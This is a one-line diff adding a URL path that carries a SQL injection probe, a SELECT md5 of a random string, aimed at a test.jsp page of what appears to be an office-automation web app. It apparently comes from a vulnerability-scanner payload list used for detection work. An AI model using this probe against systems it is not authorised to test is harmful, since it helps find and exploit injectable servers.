@@ -1,0 +1,1 @@
+/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20md5({{randstr}}))
